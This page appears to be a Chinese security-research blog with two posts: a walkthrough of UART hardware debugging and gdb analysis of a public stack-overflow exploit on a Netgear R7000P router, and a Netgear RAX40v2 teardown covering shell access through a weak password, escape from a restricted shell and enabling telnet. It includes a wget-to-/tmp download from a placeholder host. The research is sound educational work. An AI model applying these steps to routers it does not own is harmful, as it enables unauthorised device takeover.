<li>TX （接收）</li>
<li>RX  （发送）</li>
<li>GND （接地）</li>
<li>Vcc （供电）</li>
</ul>
<p><strong>识别GND 引脚</strong><br>路由器PCB（通电）: 我是通电状态下测的<br>万用表：将万用表指针指向一个类似wifi 信号的符号。<br>万用表的黑色探针放在地面或者任意金属面，红色探针分别在4根引脚出逐一测试，直到听到滴滴或者哔哔的声音。下面这块PCB设备，第三根是GND引脚。<br>这种测试被称为通导性测试。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image8-1621474546801.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image8"></p>
<p><strong>识别Vcc 引脚</strong><br>PCB： 需要给PCB板子通电<br>万用表：指针指向20V的直流档位</p>
<p>1、黑色探针接地，红色探针在除了GND引脚的其他引脚测量，电压值为最大值，例如3.6V，5V等。就可以确定是VCC引脚。但是我在实际测试的时候，在第二根引脚和第四根引脚都是出现了最大电压值，不好判断。<br>第四根引脚电压值如下图所示<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image9.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image9"><br>第二根引脚电压值如下图所示<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image10.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image10"></p>
<p>2、不好判断的时候，将这两根引脚分别和GND引脚短接，设备重启，就可以判断是Vcc引脚。<br>这里我将GND引脚和第四根短接的时候，设备会重启。<br>因此第四根是Vcc引脚<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image12.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image12"></p>
<p><strong>识别TX 引脚和RX 引脚</strong><br>PCB ： 通电<br>万用表：指针指向20V的直流档位</p>
<p>1、 黑色探针放在GND 引脚，红色探针测试剩余的两根引脚。 测试GND 引脚和其他引脚之间的电压，由于设备在引导式会进行大量的数据传输，因此在电压有变化并且增大后固定一个值，那么这个引脚就是TX引脚。</p>
<p>2、 如果电压波动很小，或者一直为0，那该引脚就是Rx引脚。</p>
<h4 id="确定波特率"><a href="#确定波特率" class="headerlink" title="确定波特率"></a>确定波特率</h4><p>确定波特率有不同的方法，基本上常见的波特率都试一遍，一般都可以确定串口的波特率，但是这里介绍使用DSLogic 逻辑分析仪 来确定UART串口波特率。<br><strong>学习使用DSLogic</strong><br>首先要先学会使用逻辑分析仪，这里简单的测试让逻辑分析仪接收 “ helloworld “<br>接线： 将逻辑分析仪通道1的线接到FT232上的TXD（Tx）引脚。 然后将分析仪的黑色引线（接地线）接到GND引脚。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image13.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image13"><br>这里的DSView 工具中参数的设置需要去看说明文档，点击“开始”按钮，采集数据，然后使用XCOM串口工具设置好波特率和串口，打开串口后，设置发送的信息，点击发送即可。然后在DSView 就可以看到采集的信息了。采集完之后设置好解析，就可以看到对应的信息了<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image14.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image14"></p>
<p><strong>使用DSLogic 采集串口信息</strong><br>接线： 之前用万用表将引脚都识别出来了，因此直接把逻辑分析仪的通道1的线接到PCB串口的TX引脚上，然后将分析仪的黑色引线（接地线）接到GND引脚。如下图所示<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image15.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image15"></p>
<p>1、 线接好了之后，打开DSView 软件<br>* 设置采样率为1MHZ<br>* 设置采样时间为1s ，当然你也可以设置大一些，10s 或者更大，这样采集的信息可能会更多。<br>* 设置阈值电压，用万用表测是TX和GND之间的电压为3.34V，我这里设置为4V。<br>* 设置通道为6个，这个其实是用几个就设置几个。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image16.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image16"></p>
<p>点击开始按钮，进行采集，然后重启路由器PCB。<br>采集结果如下图所示<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image17.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image17"><br>注意这里显示了正常的ASCII码，是因为我设置好了波特率。一般来说，常用的波特率有常见波特率1200、2400、4800、19200、38400、57600、9600、115200。<br>如下图所示，如果不对，则为乱码，因此可以确定波特率为115200<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image18.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image18"></p>
<p><strong>PCB串口接入</strong><br>接线方式：<br>TTL    —– 路由器UART<br>GND  —– GND<br>TX   —– RX<br>RX  —– TX<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image19.jpg" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image19"><br>使用SecureCRT 接入连接<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image20.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image20"></p>
<h3 id="远程动态调试"><a href="#远程动态调试" class="headerlink" title="远程动态调试"></a>远程动态调试</h3><p>动态调试工具：编译好的 gdbserver (arm 架构)、gdb(arm 架构)<br>poc: 【<a target="_blank" rel="noopener" href="https://github.com/grimm-co/NotQuite0DayFriday/blob/trunk/2020.06.15-netgear/exploit.py%E3%80%91">https://github.com/grimm-co/NotQuite0DayFriday/blob/trunk/2020.06.15-netgear/exploit.py】</a></p>
<p><strong>gdbserver 启动</strong><br>在使用串口接入设备之后，把gdbserver 上传到设备的&#x2F;tmp 目录中</p>
<pre><code>cd /tmp/;wget http://xx.xx.xx.xx:xxxx/gdbserver;chmod 777 gdbserver
</code></pre>
<p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image21.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image21"><br>在设备中查找 “httpd” 的进程号<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image22.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image22"><br>将httpd 进行附加到 gdbserver</p>
<pre><code>./gdbserver *:12345 --attach 3256
</code></pre>
<p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image23.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image23"></p>
<p><strong>gdb 远程连接gdbserver</strong></p>
<pre><code>target remote 192.168.1.1:12345
</code></pre>
<p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image24.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image24"></p>
<p><strong>开始调试</strong><br>在关键的地点打好断点<br>打断点</p>
<pre><code>(gdb) break *0x00017398
Breakpoint 1 at 0x17398
(gdb) break *0x0001CFF0
Breakpoint 2 at 0x1cff0
(gdb) break *0x0001D0C4
Breakpoint 3 at 0x1d0c4
</code></pre>
<p>然后输入”continue”， 接着执行exploit</p>
<p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image25.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image25"><br>到$R0寄存器中作为vulfunc的参数<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image26.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image26"><br>接下来我们看寄存器的值，可以看到$r0 寄存器的值为 0xbe940f89</p>
<p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image27.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image27"></p>
<p>查看0xbe940f89 内存地址中的值，可以看到内存中成功的被覆盖了构造好的数据。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image28.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image28"></p>
<p>然后接着“continue” 往下执行，执行到 0x0001cff0 断点位置会执行 memcpy 函数。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image29.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image29"><br>查看执行到memcpy函数时，寄存器中的值，由于memcpy函数会调用 $r0 , $r1 , $r2 寄存器的值作为参数<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image30.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image30"><br>查看$r0 , 和 r1 寄存器内的值， 在执行前r0 还没被$r1 中的值覆盖。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image31.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image31"><br>执行完memcpy 函数之后r0 被r1中的值所覆盖<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image32.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image32"><br>接着往下执行，vulfunc函数 会把栈上的地址复制到 r4~r11,pc 寄存器中<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image33.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image33"><br>接着往下执行到system 函数，可以看到 $r0 寄存器地址上的值是我们要执行的command。接着往下执行就会达到执行命令的效果<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image34.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image34"></p>
<h3 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h3><p>虽然poc 中已经计算好了偏移，但是我们需要自己去计算。<br>如下图所示，我们可以知道memcpy 中 第一个参数s 的离栈底的偏移是 136<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image35.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image35"><br>最终构造的rop 链如下图所示<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image36.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image36"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这个漏洞的调试，可以学些到通过UART在路由器中进行远程调试。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://tig3rhu.github.io/2023/12/17/NetGear%20R7000P%20%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/" data-id="clq9l1r3t0006ysvb64rv6dfr" data-title="NetGear R7000P 路由器栈溢出漏洞硬件调试与分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NetGear_夜鹰_RAX40V2_设备与固件分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/12/16/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2023-12-16T12:57:42.231Z" itemprop="datePublished">2023-12-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/12/16/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/">NetGear_夜鹰_RAX40V2_设备与固件分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="NetGear-夜鹰-RAX40V2-设备与固件分析"><a href="#NetGear-夜鹰-RAX40V2-设备与固件分析" class="headerlink" title="NetGear 夜鹰 RAX40V2 设备与固件分析"></a>NetGear 夜鹰 RAX40V2 设备与固件分析</h1><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>NetGear 厂商的路由器设备中，拆解开经常会带有UART 调试串口，并且以往的NetGear 设备UART调试口往往只需要正确的检测出UART引脚的类型，设置波特率为115200，然后直接用串口调试软件配合FT232就可以直接获取设备内部的shell。但是Nightawk 夜鹰 RAX40V2 路由器在接入UART调试串口时，却有所不同。本篇文章，将带来对NetGear RAX40v2 在路由器开发板上的UART 获取shell的过程中遇到的一些问题，如何进行解决，循序渐进的开启设备的telnet，让我们拭目以待。</p>
<h3 id="0x02-设备分析"><a href="#0x02-设备分析" class="headerlink" title="0x02 设备分析"></a>0x02 设备分析</h3><p>产品名称：Nighthawk AX4 4-Stream WiFi Router</p>
<p>固件版本：V1.0.2.82_2.0.50</p>
<p>发布日期：2020年 </p>
<p>首先我们从设备侧入手，拆解的过程以及设备硬件的配置，这不属于本片文章的重点，这里就不做过多的讲解。</p>
<h3 id="0x03-设备串口分析"><a href="#0x03-设备串口分析" class="headerlink" title="0x03 设备串口分析"></a>0x03 设备串口分析</h3><p>引脚分析，这款设备的引脚已经给了针脚，也免去了另外焊接针脚的工作，根据万用表和逻辑分析仪的识别（其实没用到逻辑分析仪）</p>
<p>从上到下依次是  VCC 引脚、GND引脚 (红线)、TXD引脚（黄线）、RXD引脚（橙线）</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210801191841695.png" alt="image-20210801191841695"></p>
<p><strong>波特率识别</strong></p>
<p>首先识别FTD 232 USB “ls -ll &#x2F;dev&#x2F;tty*” </p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723101732932.png" alt="image-20210723101732932"></p>
<p>接下来使用devttys0 的小工具baudrate.py 来识别波特率，只需要简单的使用上下键，就可以识别不同的波特率。如下图所示，设备识别为115200。 这也是NetGear 常用的波特率，其他的厂商的波特率也很多使用这个波特率。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715091851990.png" alt="image-20210715091851990"></p>
<p>tip： 这里顺带提一下，baudrate.py 识别的波特率是设置好的常见波特率，但是里面只设置了几个可以识别的波特率，如果需要增加识别广度，需要在脚本内部的BAUDRATES 参数中增加想要识别的波特率值。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210731160636040.png" alt="image-20210731160636040"></p>
<p><strong>获取启动log</strong></p>
<p>现在我们已经知道了波特率，接下来获取设备在启动的时候的log 信息，分析这些log 对设备分析有的时候会非常有用。但是常常 UART 的log 信息会非常多并且启动比较快。因此需要想办法将这些log 保存下来，以便后续分析。</p>
<p>我们使用minicom 打开，选择 “Serial port setup” –&gt; 设置 ”A—Serial Device“ 和 ”E “的波特率，minicom 使用的方法搜索一下有详细的使用说明。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723101955993.png" alt="image-20210723101955993"></p>
<p>保存串口log 为文件，关闭也是一样的。最终可以看到生成的文件，文本编辑器打开生成的文件。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723105834287.png" alt="image-20210723105834287"></p>
<p>tips: 非正常关闭minicom，会在&#x2F;var&#x2F;lock下创建几个文件LCK*，这几个文件阻止了minicom的运行，将它们删除后即可恢复。</p>
<p> 查看设备启动的log ，log 很多，这里截选了部分的log信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">squashfs: version 4.0 (2009/01/31) Phillip Lougher</span><br><span class="line">jffs2: version 2.2. (NAND) (SUMMARY)  © 2001-2006 Red Hat, Inc.</span><br><span class="line">fuse init (API version 7.23)</span><br><span class="line">SGI XFS with security attributes, no debug enabled</span><br><span class="line">io scheduler noop registered (default)</span><br><span class="line">brd: module loaded</span><br><span class="line">loop: module loaded</span><br><span class="line">nand: device found, Manufacturer ID: 0xef, Chip ID: 0xda</span><br><span class="line">nand: Unknown W29N02GV</span><br><span class="line">nand: 256 MiB, SLC, erase size: 128 KiB, page size: 2048, OOB size: 64</span><br><span class="line">bcm63xx_nand ff801800.nand: Adjust timing_1 to 0x6532845b timing_2 to 0x00091e94</span><br><span class="line">bcm63xx_nand ff801800.nand: detected 256MiB total, 128KiB blocks, 2KiB pages, 16B OOB, 8-bit, BCH-4</span><br><span class="line">Bad block table found at page 131008, version 0x01</span><br><span class="line">Bad block table found at page 130944, version 0x01</span><br><span class="line">&gt;&gt;&gt;&gt;&gt; For primary mtd partition rootfs, cferam/vmlinux.lz UBI volume, vmlinux fs mounted as squash fs on UBI &lt;&lt;&lt;&lt;&lt;</span><br><span class="line">Secondary mtd partition rootfs_update detected as UBI for cferam/vmlinux source and UBIFS for vmlinux filesystem</span><br><span class="line">Creating 11 MTD partitions on &quot;brcmnand.0&quot;:</span><br><span class="line">0x000000100000-0x000006900000 : &quot;rootfs&quot;</span><br><span class="line">0x000006900000-0x000006d00000 : &quot;rootfs_update&quot;</span><br><span class="line">0x000007f00000-0x00000ff00000 : &quot;data&quot;</span><br><span class="line">0x000000000000-0x000000100000 : &quot;nvram&quot;</span><br><span class="line">0x000000100000-0x000006900000 : &quot;image&quot;</span><br><span class="line">0x000006900000-0x000006d00000 : &quot;image_update&quot;</span><br><span class="line">0x000000000000-0x000010000000 : &quot;dummy1&quot;</span><br><span class="line">0x000000000000-0x000010000000 : &quot;dummy2&quot;</span><br><span class="line">0x000007a00000-0x000007f00000 : &quot;misc3&quot;</span><br><span class="line">0x000007500000-0x000007a00000 : &quot;misc2&quot;</span><br><span class="line">0x000006d00000-0x000007500000 : &quot;misc1&quot;</span><br><span class="line">tun: Universal TUN/TAP device driver, 1.6</span><br><span class="line">tun: (C) 1999-2004 Max Krasnyansky &lt;maxk@qualcomm.com&gt;</span><br><span class="line">PPP generic driver version 2.4.2</span><br><span class="line">PPP BSD Compression module registered</span><br><span class="line">PPP Deflate Compression module registered</span><br><span class="line">NET: Registered protocol family 24</span><br><span class="line">i2c /dev entries driver</span><br><span class="line">bcm96xxx-wdt ff800480.watchdog: Broadcom BCM96xxx watchdog timer</span><br><span class="line">brcmboard registered</span><br><span class="line">brcmboard: brcm_board_init entry</span><br><span class="line">print_rst_status: Last RESET due to HW reset</span><br><span class="line">print_rst_status: RESET reason: 0x00000000</span><br><span class="line">DYING GASP IRQ Initialized and Enabled</span><br><span class="line">map_hw_timer_interrupt,130: interrupt_id 22</span><br><span class="line">map_hw_timer_interrupt,130: interrupt_id 23</span><br><span class="line">map_hw_timer_interrupt,130: interrupt_id 24</span><br><span class="line">map_hw_timer_interrupt,130: interrupt_id 25</span><br><span class="line">Allocated EXT_TIMER number 3</span><br><span class="line">Broadcom Timer Initialized </span><br></pre></td></tr></table></figure>

<p><strong>接入UART调试口shell</strong></p>
<p>UART 接入，设置好波特率，重启设备，待设备系统启动完成，启动日志输出完之后，连接shell ，但是需要登录口令。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210712165152831.png" alt="image-20210712165152831"></p>
<p>遇到这种方法，本打算尝试调整uboot在引导linux kernel时使用的启动参数(bootargs) 直接访问跟文件系统。但是我很幸运的使用弱口令进去之后，但是发现这是一个低权限的shell，并且支持的可执行的命令非常有限。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210713111508346.png" alt="image-20210713111508346"></p>
<p>正当我一筹莫展的时候，想起了曾经看到的一款思科的设备的shell 也是类似这种低权限的shell，但是输入 “sh”、”\bin\sh” 、”bash” 等命令可以获取完整版的shell。很幸运，在我输入”sh” 之后，成功的获取了设备完整的shell，并且支持的可执行的命令也变多了。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210712163602257.png" alt="image-20210712163602257"></p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210712163621067.png" alt="image-20210712163621067"></p>
<p>busybox</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210712163718580.png" alt="image-20210712163718580"></p>
<h3 id="0x04-开启telnet"><a href="#0x04-开启telnet" class="headerlink" title="0x04 开启telnet"></a>0x04 开启telnet</h3><p>到这里我已经能通过UART串口获取设备的shell了，但是进入设备shell 过于复杂，并且我也不满足于UART的shell， 于是接着我尝试开启设备的ssh 、 telnet 的shell。我在测试的过程中，执行&#x2F;bin&#x2F;文件中的telnetd 毫无反应，并且执行busyBox 中的telnetd 也同样显示错误，我开始猜测开发者可能将telnetd做了更改，导致无法正常使用，但是我在 &#x2F;usr&#x2F;sbin&#x2F;文件目录中找到了 utelnetd 可执行文件，并且执行后很明显的开启了23端口进行监听连接。然而一切都不如我所愿，进行登录的时候又显示需要登录口令，我尝试使用UART的弱口令和一些常见的口令也无法进入shell。</p>
